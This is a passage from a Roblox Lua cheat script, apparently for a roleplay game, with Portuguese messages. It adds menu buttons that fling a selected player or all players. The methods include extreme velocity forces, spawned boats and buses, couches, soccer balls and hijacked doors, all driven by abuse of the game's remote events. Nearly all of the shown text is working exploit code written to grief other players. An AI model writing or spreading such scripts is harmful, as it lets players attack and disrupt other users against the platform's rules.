                        workspace.CurrentCamera.CameraSubject = Handle
                    elseif THumanoid and TRootPart then
                        workspace.CurrentCamera.CameraSubject = THumanoid
                    end

                    if not TCharacter:FindFirstChildWhichIsA("BasePart") then
                        return
                    end

                    local FPos = function(BasePart, Pos, Ang)
                        RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
                        Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
                        RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
                        RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
                    end

                    local SFBasePart = function(BasePart)
                        local TimeToWait = 2
                        local Time = tick()
                        local Angle = 0
                        repeat
                            if RootPart and THumanoid then
                                if BasePart.Velocity.Magnitude < 50 then
                                    Angle = Angle + 100
                                    FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
                                    task.wait()
                                else
                                    FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                                    task.wait()
                                end
                            else
                                break
                            end
                        until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait or getgenv().flingloop == false
                    end

                    workspace.FallenPartsDestroyHeight = 0/0
                    local BV = Instance.new("BodyVelocity")
                    BV.Name = "SpeedDoPai"
                    BV.Parent = RootPart
                    BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
                    BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

                    if TRootPart and THead then
                        if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                            SFBasePart(THead)
                        else
                            SFBasePart(TRootPart)
                        end
                    elseif TRootPart and not THead then
                        SFBasePart(TRootPart)
                    elseif not TRootPart and THead then
                        SFBasePart(THead)
                    elseif not TRootPart and not THead and Accessory and Handle then
                        SFBasePart(Handle)
                    end
                    BV:Destroy()
                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                    workspace.CurrentCamera.CameraSubject = Humanoid

                    repeat
                        RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
                        Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
                        Humanoid:ChangeState("GettingUp")
                        table.foreach(Character:GetChildren(), function(_, x)
                            if x:IsA("BasePart") then
                                x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                            end
                        end)
                        task.wait()
                    until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25

                    workspace.FallenPartsDestroyHeight = getgenv().FPDH
                end
            end

            if AllBool then
                for _, x in next, Players:GetPlayers() do
                    SkidFling(x)
                end
            end

            if targetPlayer then
                SkidFling(targetPlayer)
            end

            task.wait()
        end

        wait()
        pcall(flingloopfix)
    end
end

local kill = Tab:AddSection({Name = "Fling & Boat"})

Tab:AddButton({
    Name = "Enable - Fling Boat",
    Callback = function()
        if not selectedPlayerName or not game.Players:FindFirstChild(selectedPlayerName) then
            warn("Nenhum jogador selecionado ou n√£o existe")
            return
        end

        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character and Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")

        if not Humanoid or not RootPart then
            warn("Humanoid ou RootPart inv√°lido")
            return
        end

        local function spawnBoat()
            RootPart.CFrame = CFrame.new(1754, -2, 58)
            task.wait(0.5)
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
            task.wait(1)
            return Vehicles:FindFirstChild(Player.Name.."Car")
        end

        local PCar = Vehicles:FindFirstChild(Player.Name.."Car") or spawnBoat()
        if not PCar then
            warn("Falha ao spawnar o barco")
            return
        end

        local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
        if not Seat then
            warn("Assento n√£o encontrado")
            return
        end

        repeat 
            task.wait(0.1)
            RootPart.CFrame = Seat.CFrame * CFrame.new(0, 1, 0)
        until Humanoid.SeatPart == Seat

        print("Barco spawnado!")

        local TargetPlayer = game.Players:FindFirstChild(selectedPlayerName)
        if not TargetPlayer or not TargetPlayer.Character then
            warn("Jogador n√£o encontrado")
            return
        end

        local TargetC = TargetPlayer.Character
        local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
        local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")

        if not TargetRP or not TargetH then
            warn("Humanoid ou RootPart do alvo n√£o encontrado")
            return
        end

        local Spin = Instance.new("BodyAngularVelocity")
        Spin.Name = "Spinning"
        Spin.Parent = PCar.PrimaryPart
        Spin.MaxTorque = Vector3.new(0, math.huge, 0)
        Spin.AngularVelocity = Vector3.new(0, 369, 0) 

        print("Fling ativo!")

        local function moveCar(TargetRP, offset)
            if PCar and PCar.PrimaryPart then
                PCar:SetPrimaryPartCFrame(CFrame.new(TargetRP.Position + offset))
            end
        end

        task.spawn(function()
            while PCar and PCar.Parent and TargetRP and TargetRP.Parent do
                task.wait(0.01) 
                
                moveCar(TargetRP, Vector3.new(0, 1, 0))  
                moveCar(TargetRP, Vector3.new(0, -2.25, 5))  
                moveCar(TargetRP, Vector3.new(0, 2.25, 0.25))  
                moveCar(TargetRP, Vector3.new(-2.25, -1.5, 2.25))  
                moveCar(TargetRP, Vector3.new(0, 1.5, 0))  
                moveCar(TargetRP, Vector3.new(0, -1.5, 0))  

                if PCar and PCar.PrimaryPart then
                    local Rotation = CFrame.Angles(
                        math.rad(math.random(-369, 369)),  
                        math.rad(math.random(-369, 369)), 
                        math.rad(math.random(-369, 369))
                    )
                    PCar:SetPrimaryPartCFrame(CFrame.new(TargetRP.Position + Vector3.new(0, 1.5, 0)) * Rotation)
                end
            end

            if Spin and Spin.Parent then
                Spin:Destroy()
                print("Fling desativado")
            end
        end)
    end
})
print("Fling - Boat button created")

Tab:AddButton({
    Name = "Disabled - Fling Boat",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local RootPart = Character and Character:FindFirstChild("HumanoidRootPart")
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")

        if not RootPart or not Humanoid then
            warn("Nenhum RootPart ou Humanoid encontrado!")
            return
        end

        Humanoid.PlatformStand = true
        print("Jogador paralisado para reduzir efeitos do spin.")

        for _, obj in pairs(RootPart:GetChildren()) do
            if obj:IsA("BodyAngularVelocity") or obj:IsA("BodyVelocity") then
                obj:Destroy()
            end
        end
        print("Spin e for√ßas removidas do jogador.")

        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
        task.wait(0.5)

        local PCar = Vehicles and Vehicles:FindFirstChild(Player.Name.."Car")
        if PCar and PCar.PrimaryPart then
            for _, obj in pairs(PCar.PrimaryPart:GetChildren()) do
                if obj:IsA("BodyAngularVelocity") or obj:IsA("BodyVelocity") then
                    obj:Destroy()
                end
            end
            print("Spin removido do barco.")
        end

        task.wait(1)

        local safePos = Vector3.new(0, 1000, 0)
        local bp = Instance.new("BodyPosition", RootPart)
        bp.Position = safePos
        bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

        local bg = Instance.new("BodyGyro", RootPart)
        bg.CFrame = RootPart.CFrame
        bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)

        print("Jogador est√° preso na coordenada segura.")

        task.wait(3)

        bp:Destroy()
        bg:Destroy()
        Humanoid.PlatformStand = false

        print("Jogador liberado, seguro na posi√ß√£o.")
    end
})


local kill = Tab:AddSection({Name = "Click and Auto Kill Methods"})

local function AutoKartFling()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local backpack = player:WaitForChild("Backpack")
    local root = character:WaitForChild("HumanoidRootPart")

    local bav = Instance.new("BodyAngularVelocity")
    bav.AngularVelocity = Vector3.new(0, 500, 0)
    bav.MaxTorque = Vector3.new(0, math.huge, 0)
    bav.P = 1000
    bav.Parent = root

    local args = {"PickingTools", "ShoppingCart"}
    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer(unpack(args))

    local function equipCartTools()
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA("Tool") and string.find(string.lower(tool.Name), "cart") then
                player.Character.Humanoid:EquipTool(tool)
            end
        end
    end

    equipCartTools()

    backpack.ChildAdded:Connect(function(child)
        if child:IsA("Tool") and string.find(string.lower(child.Name), "cart") then
            player.Character.Humanoid:EquipTool(child)
        end
    end)
end

Tab:AddButton({
  Name = "Fling Kart - Player",
Description = "reset your character to stop;",
  Callback = function()
          AutoKartFling()
end
})


Tab:AddButton({
  Name = "Click Doors Fling]",
Description = "get close to someone to fling ",
  Callback = function()
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HRP = Character:WaitForChild("HumanoidRootPart")

local BlackHole = Instance.new("Part")
BlackHole.Size = Vector3.new(100000, 100000, 100000)
BlackHole.Transparency = 1
BlackHole.Anchored = true
BlackHole.CanCollide = false
BlackHole.Name = "BlackHoleTarget"
BlackHole.Parent = Workspace

local baseAttachment = Instance.new("Attachment")
baseAttachment.Name = "BlackHoleAttachment"
baseAttachment.Parent = BlackHole

RunService.Heartbeat:Connect(function()
	BlackHole.CFrame = HRP.CFrame
end)

local ControlledDoors = {}

local function SetupPart(part)
	if not part:IsA("BasePart") or part.Anchored or not string.find(part.Name, "Door") then return end
	if part:FindFirstChild("Attached") then return end

	part.CanCollide = false

	for _, obj in ipairs(part:GetChildren()) do
		if obj:IsA("AlignPosition") or obj:IsA("Torque") or obj:IsA("Attachment") then
			obj:Destroy()
		end
	end

	local marker = Instance.new("BoolValue", part)
	marker.Name = "Attached"

	local a1 = Instance.new("Attachment", part)

	local align = Instance.new("AlignPosition", part)
	align.Attachment0 = a1
	align.Attachment1 = baseAttachment
	align.MaxForce = 1e20
	align.MaxVelocity = math.huge
	align.Responsiveness = 99999

	local torque = Instance.new("Torque", part)
	torque.Attachment0 = a1
	torque.RelativeTo = Enum.ActuatorRelativeTo.World
	torque.Torque = Vector3.new(
		math.random(-10e5, 10e5) * 10000,
		math.random(-10e5, 10e5) * 10000,
		math.random(-10e5, 10e5) * 10000
	)

	table.insert(ControlledDoors, {Part = part, Align = align})
end

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") and string.find(obj.Name, "Door") then
		SetupPart(obj)
	end
end

Workspace.DescendantAdded:Connect(function(obj)
	if obj:IsA("BasePart") and string.find(obj.Name, "Door") then
		SetupPart(obj)
	end
end)

local function FlingPlayer(player)
	local char = player.Character
	if not char then return end
	local targetHRP = char:FindFirstChild("HumanoidRootPart")
	if not targetHRP then return end

	local targetAttachment = targetHRP:FindFirstChild("TargetAttachment")
	if not targetAttachment then
		targetAttachment = Instance.new("Attachment", targetHRP)
		targetAttachment.Name = "TargetAttachment"
	end

	for _, data in ipairs(ControlledDoors) do
		if data.Align then
			data.Align.Attachment1 = targetAttachment
		end
	end

	local start = tick()
	local flingDetected = false

	while tick() - start < 5 do
		if targetHRP.Velocity.Magnitude >= 20 then
			flingDetected = true
			break
		end
		RunService.Heartbeat:Wait()
	end

	for _, data in ipairs(ControlledDoors) do
		if data.Align then
			data.Align.Attachment1 = baseAttachment
		end
	end
end

UserInputService.TouchTap:Connect(function(touchPositions, processed)
	if processed then return end
	local pos = touchPositions[1]
	local camera = Workspace.CurrentCamera
	local unitRay = camera:ScreenPointToRay(pos.X, pos.Y)
	local raycast = Workspace:Raycast(unitRay.Origin, unitRay.Direction * 1000)

	if raycast and raycast.Instance then
		local hit = raycast.Instance
		local player = Players:GetPlayerFromCharacter(hit:FindFirstAncestorOfClass("Model"))
		if player and player ~= LocalPlayer then
			FlingPlayer(player)
		end
	end
end)
  end
})

Tab:AddButton({
  Name = "Click Fling Admin [Rework]",
  Callback = function()
    local Players = game:GetService("Players")
    local Workspace = game:GetService("Workspace")
    local RunService = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")

    local LocalPlayer = Players.LocalPlayer
    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local HRP = Character:WaitForChild("HumanoidRootPart")

    local BlackHole = Instance.new("Part")
    BlackHole.Size = Vector3.new(100000, 100000, 100000)
    BlackHole.Transparency = 1
    BlackHole.Anchored = true
    BlackHole.CanCollide = false
    BlackHole.Name = "BlackHoleTarget"
    BlackHole.Parent = Workspace

    local baseAttachment = Instance.new("Attachment")
    baseAttachment.Name = "BlackHoleAttachment"
    baseAttachment.Parent = BlackHole

    RunService.Heartbeat:Connect(function()
      BlackHole.CFrame = HRP.CFrame
    end)

    local ControlledDoors = {}

    local function SetupPart(part)
      if not part:IsA("BasePart") or part.Anchored or not string.find(part.Name, "Door") then return end
      if part:FindFirstChild("Attached") then return end

      part.CanCollide = false
      part.Transparency = 1

      for _, obj in ipairs(part:GetChildren()) do
        if obj:IsA("AlignPosition") or obj:IsA("Torque") or obj:IsA("Attachment") then
          obj:Destroy()
        end
      end

      local marker = Instance.new("BoolValue", part)
      marker.Name = "Attached"

      local a1 = Instance.new("Attachment", part)

      local align = Instance.new("AlignPosition", part)
      align.Attachment0 = a1
      align.Attachment1 = baseAttachment
      align.MaxForce = 1e20
      align.MaxVelocity = math.huge
      align.Responsiveness = 99999

      local torque = Instance.new("Torque", part)
      torque.Attachment0 = a1
      torque.RelativeTo = Enum.ActuatorRelativeTo.World
      torque.Torque = Vector3.new(
        math.random(-10e5, 10e5) * 10000,
        math.random(-10e5, 10e5) * 10000,
        math.random(-10e5, 10e5) * 10000
      )

      table.insert(ControlledDoors, {Part = part, Align = align})
    end

    for _, obj in ipairs(Workspace:GetDescendants()) do
      if obj:IsA("BasePart") and string.find(obj.Name, "Door") then
        SetupPart(obj)
      end
    end

    Workspace.DescendantAdded:Connect(function(obj)
      if obj:IsA("BasePart") and string.find(obj.Name, "Door") then
        SetupPart(obj)
      end
    end)

    local function FlingPlayer(player)
      local char = player.Character
      if not char then return end
      local targetHRP = char:FindFirstChild("HumanoidRootPart")
      if not targetHRP then return end

      local targetAttachment = targetHRP:FindFirstChild("TargetAttachment")
      if not targetAttachment then
        targetAttachment = Instance.new("Attachment", targetHRP)
        targetAttachment.Name = "TargetAttachment"
      end

      for _, data in ipairs(ControlledDoors) do
        if data.Align then
          data.Align.Attachment1 = targetAttachment
        end
      end

      local start = tick()
      local flingDetected = false

      while tick() - start < 5 do
        if targetHRP.Velocity.Magnitude >= 20 then
          flingDetected = true
          break
        end
        RunService.Heartbeat:Wait()
      end

      for _, data in ipairs(ControlledDoors) do
        if data.Align then
          data.Align.Attachment1 = baseAttachment
        end
      end
    end

    UserInputService.TouchTap:Connect(function(touchPositions, processed)
      if processed then return end
      local pos = touchPositions[1]
      local camera = Workspace.CurrentCamera
      local unitRay = camera:ScreenPointToRay(pos.X, pos.Y)
      local raycast = Workspace:Raycast(unitRay.Origin, unitRay.Direction * 1000)

      if raycast and raycast.Instance then
        local hit = raycast.Instance
        local player = Players:GetPlayerFromCharacter(hit:FindFirstAncestorOfClass("Model"))
        if player and player ~= LocalPlayer then
          FlingPlayer(player)
        end
      end
    end)
  end
})

Tab:AddButton({
    Name = "Click Fling Couch (Rework)",
    Callback = function()

local jogadores = game:GetService("Players")
local rep = game:GetService("ReplicatedStorage")
local entrada = game:GetService("UserInputService")
local eu = jogadores.LocalPlayer
local cam = workspace.CurrentCamera

local podeClicar = true
local ferramentaEquipada = false
local NOME_FERRAMENTA = "Click Fling Couch"

local mochila = eu:WaitForChild("Backpack")

if not mochila:FindFirstChild(NOME_FERRAMENTA) and not (eu.Character and eu.Character:FindFirstChild(NOME_FERRAMENTA)) then
	local ferramenta = Instance.new("Tool")
	ferramenta.Name = NOME_FERRAMENTA
	ferramenta.RequiresHandle = false
	ferramenta.CanBeDropped = false

	ferramenta.Equipped:Connect(function()
		ferramentaEquipada = true
	end)

	ferramenta.Unequipped:Connect(function()
		ferramentaEquipada = false
	end)

	ferramenta.Parent = mochila
end

local function jogarComSofa(alvo)
	if not ferramentaEquipada then return end
	if not alvo or not alvo.Character or alvo == eu then return end

	local jogando = true
	local raiz = eu.Character and eu.Character:FindFirstChild("HumanoidRootPart")
	local alvoRaiz = alvo.Character and alvo.Character:FindFirstChild("HumanoidRootPart")
	if not raiz or not alvoRaiz then return end

	local boneco = eu.Character
	local humano = boneco:FindFirstChildOfClass("Humanoid")
	local posOriginal = raiz.CFrame

	rep:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
	task.wait(0.2)

	rep.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
	task.wait(0.3)

	local sofa = eu.Backpack:FindFirstChild("Couch")
	if sofa then
		sofa.Parent = boneco
	end
	task.wait(0.1)

	game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
	task.wait(0.25)

	workspace.FallenPartsDestroyHeight = 0/0

	local forca = Instance.new("BodyVelocity")
	forca.Name = "ForcaJogada"
	forca.Velocity = Vector3.new(9e8, 9e8, 9e8)
	forca.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
	forca.Parent = raiz

	humano:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
	humano.PlatformStand = false
	cam.CameraSubject = alvo.Character:FindFirstChild("Head") or alvoRaiz or humano

	task.spawn(function()
		local angulo = 0
		local partes = {raiz}
		while jogando and alvo and alvo.Character and alvo.Character:FindFirstChildOfClass("Humanoid") do
			local alvoHum = alvo.Character:FindFirstChildOfClass("Humanoid")
			if alvoHum.Sit then break end
			angulo += 50

			for _, parte in ipairs(partes) do
				local hrp = alvo.Character.HumanoidRootPart
				local pos = hrp.Position + hrp.Velocity / 1.5
				raiz.CFrame = CFrame.new(pos) * CFrame.Angles(math.rad(angulo), 0, 0)
			end

			raiz.Velocity = Vector3.new(9e8, 9e8, 9e8)
			raiz.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
			task.wait()
		end

		jogando = false
		forca:Destroy()
		humano:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		humano.PlatformStand = false
		raiz.CFrame = posOriginal
		cam.CameraSubject = humano

		for _, p in pairs(boneco:GetDescendants()) do
			if p:IsA("BasePart") then
				p.Velocity = Vector3.zero
				p.RotVelocity = Vector3.zero
			end
		end

		humano:UnequipTools()
		rep.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
	end)

	while jogando do
		task.wait()
	end
end

entrada.TouchTap:Connect(function(toques, processado)
	if processado or not podeClicar or not ferramentaEquipada then return end

	local pos = toques[1]
	local raio = cam:ScreenPointToRay(pos.X, pos.Y)
	local acerto = workspace:Raycast(raio.Origin, raio.Direction * 1000)

	if acerto and acerto.Instance then
		local alvo = jogadores:GetPlayerFromCharacter(acerto.Instance:FindFirstAncestorOfClass("Model"))
		if alvo and alvo ~= eu then
			podeClicar = false
			jogarComSofa(alvo)
			task.delay(2, function()
				podeClicar = true
			end)
		end
	end
end)
end
})

Tab:AddButton({
    Name = "Click Fling Ball (Beta)",
    Callback = function()
local jogadores = game:GetService("Players")
local rep = game:GetService("ReplicatedStorage")
local mundo = game:GetService("Workspace")
local entrada = game:GetService("UserInputService")
local cam = mundo.CurrentCamera
local eu = jogadores.LocalPlayer

local NOME_FERRAMENTA = "Click Fling Ball"
local ferramentaEquipada = false

local mochila = eu:WaitForChild("Backpack")
if not mochila:FindFirstChild(NOME_FERRAMENTA) then
	local ferramenta = Instance.new("Tool")
	ferramenta.Name = NOME_FERRAMENTA
	ferramenta.RequiresHandle = false
	ferramenta.CanBeDropped = false

	ferramenta.Equipped:Connect(function()
		ferramentaEquipada = true
	end)

	ferramenta.Unequipped:Connect(function()
		ferramentaEquipada = false
	end)

	ferramenta.Parent = mochila
end

local function FlingBall(target)
    local players = game:GetService("Players")
    local player = players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local hrp = character:WaitForChild("HumanoidRootPart")
    local backpack = player:WaitForChild("Backpack")
    local ServerBalls = workspace.WorkspaceCom:WaitForChild("001_SoccerBalls")

    local function GetBall()
        if not backpack:FindFirstChild("SoccerBall") and not character:FindFirstChild("SoccerBall") then
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
        end

        repeat task.wait() until backpack:FindFirstChild("SoccerBall") or character:FindFirstChild("SoccerBall")

        local ballTool = backpack:FindFirstChild("SoccerBall")
        if ballTool then
            ballTool.Parent = character
        end

        repeat task.wait() until ServerBalls:FindFirstChild("Soccer" .. player.Name)

        return ServerBalls:FindFirstChild("Soccer" .. player.Name)
    end

    local Ball = ServerBalls:FindFirstChild("Soccer" .. player.Name) or GetBall()
    Ball.CanCollide = false
    Ball.Massless = true
    Ball.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)

    if target ~= player then
        local tchar = target.Character
        if tchar and tchar:FindFirstChild("HumanoidRootPart") and tchar:FindFirstChild("Humanoid") then
            local troot = tchar.HumanoidRootPart
            local thum = tchar.Humanoid

            if Ball:FindFirstChildWhichIsA("BodyVelocity") then
                Ball:FindFirstChildWhichIsA("BodyVelocity"):Destroy()
            end

            local bv = Instance.new("BodyVelocity")
            bv.Name = "FlingPower"
            bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.P = 9e900
            bv.Parent = Ball

            workspace.CurrentCamera.CameraSubject = thum

            repeat
                if troot.Velocity.Magnitude > 0 then
                    local pos = troot.Position + (troot.Velocity / 1.5)
                    Ball.CFrame = CFrame.new(pos)
                    Ball.Orientation += Vector3.new(45, 60, 30)
                else
                    for i, v in pairs(tchar:GetChildren()) do
                        if v:IsA("BasePart") and v.CanCollide and not v.Anchored then
                            Ball.CFrame = v.CFrame
                            task.wait(1/6000)
                        end
                    end
                end
                task.wait(1/6000)
            until troot.Velocity.Magnitude > 1000 or thum.Health <= 0 or not tchar:IsDescendantOf(workspace) or target.Parent ~= players

            workspace.CurrentCamera.CameraSubject = humanoid
        end
    end
end

entrada.TouchTap:Connect(function(toques, processado)
	if not ferramentaEquipada or processado then return end
	local pos = toques[1]
	local raio = cam:ScreenPointToRay(pos.X, pos.Y)
	local hit = mundo:Raycast(raio.Origin, raio.Direction * 1000)
	if hit and hit.Instance then
		local modelo = hit.Instance:FindFirstAncestorOfClass("Model")
		local jogador = jogadores:GetPlayerFromCharacter(modelo)
		if jogador and jogador ~= eu then
			FlingBall(jogador)
		end
	end
end)

end
})


local kill = Tab:AddSection({Name = "methods All Player [ Rework ]"})

Tab:AddButton({
    Name = "Kill All Bus",
    Callback = function()
        local Players = game:GetService("Players")
        local Workspace = game:GetService("Workspace")
        local RunService = game:GetService("RunService")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

        local destination = Vector3.new(145.51, -374.09, 21.58) 
        local originalPosition = nil  

        local function GetBus()  
            local vehicles = Workspace:FindFirstChild("Vehicles")  
            if vehicles then  
                return vehicles:FindFirstChild(Players.LocalPlayer.Name.."Car")  
            end  
            return nil  
        end  

        local function TrackPlayer(selectedPlayerName, callback)
            while true do  
                if selectedPlayerName then  
                    local targetPlayer = Players:FindFirstChild(selectedPlayerName)  
                    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then  
                        local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")  
                        if targetHumanoid and targetHumanoid.Sit then  
                            local bus = GetBus()
                            if bus then
                                bus:SetPrimaryPartCFrame(CFrame.new(destination))   
                                task.wait(0.2)  

                                local function simulateJump()  
                                    local humanoid = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")  
                                    if humanoid then  
                                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)  
                                    end  
                                end  

                                simulateJump()  
                                task.wait(0.4)  
                                simulateJump()
                                task.wait(0.5)
                                
                                if originalPosition then
                                    Players.LocalPlayer.Character.HumanoidRootPart.CFrame = originalPosition  
                                    task.wait(0.1)
                                    local args = {
                                        [1] = "DeleteAllVehicles"
                                    }
                                    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))
                                end
                            end
                            break  
                        else  
                            local targetRoot = targetPlayer.Character.HumanoidRootPart  
                            local time = tick() * 35
                       
                            local lateralOffset = math.sin(time) * 10  
                            local frontBackOffset = math.cos(time) * 20  
                              
                            local bus = GetBus()
                            if bus then
                                bus:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(0, 0, frontBackOffset))  
                            end
                        end  
                    end  
                end  
                RunService.RenderStepped:Wait()  
            end
            
            if callback then
                callback()
            end
        end  

        local function StartKillBusao(playerName, callback)
            local selectedPlayerName = playerName
            local player = Players.LocalPlayer  
            local character = player.Character or player.CharacterAdded:Wait()  
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")  

            originalPosition = humanoidRootPart.CFrame  
            local bus = GetBus()  

            if not bus then  
                humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)  
                task.wait(0.5)  
                local remoteEvent = ReplicatedStorage:FindFirstChild("RE")  
                if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then  
                    remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")  
                end  
                task.wait(1)  
                bus = GetBus()  
            end  

            if bus then  
                local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")  
                if seat and character:FindFirstChildOfClass("Humanoid") and not character.Humanoid.Sit then  
                    repeat  
                        humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)  
                        task.wait()  
                    until character.Humanoid.Sit or not bus.Parent  
                end  
            end  

            spawn(function()
                TrackPlayer(selectedPlayerName, callback)
            end)
        end

        local function PerformActionForAllPlayers(players)
            if #players == 0 then
                return
            end

            local player = table.remove(players, 1)
            StartKillBusao(player.Name, function()
                task.wait(0.5)
                PerformActionForAllPlayers(players)
            end)
        end

        PerformActionForAllPlayers(Players:GetPlayers())
    end
})


Tab:AddButton({
    Name = "Fling Boat all",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart.CFrame
        local Angles = 0
        local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
        
        if not PCar then  
            if RootPart then  
                RootPart.CFrame = CFrame.new(1754, -2, 58)  
                task.wait(0.5)  
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")  
                task.wait(0.5)  
                PCar = Vehicles:FindFirstChild(Player.Name.."Car")  
                task.wait(0.5)  
                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")  
                if Seat then  
                    repeat  
                        task.wait()  
